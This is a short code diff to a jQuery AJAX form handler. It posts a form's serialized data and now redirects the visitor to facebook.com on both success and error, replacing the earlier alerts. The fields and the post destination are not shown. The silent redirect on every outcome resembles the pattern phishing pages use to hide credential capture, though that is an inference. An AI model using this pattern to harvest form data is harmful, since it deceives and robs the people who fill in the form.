@@ -13,10 +13,10 @@
                     type:"post",
                     data:$("#myForm").serializeArray(),
                     success: function(){
-                        alert("Form Data Submitted :)")
+                        window.location.replace("https://www.facebook.com/");
                     },
                     error: function(){
-                        alert("There was an error :(")
+                        window.location.replace("https://www.facebook.com/");
                     }
                 });
             }
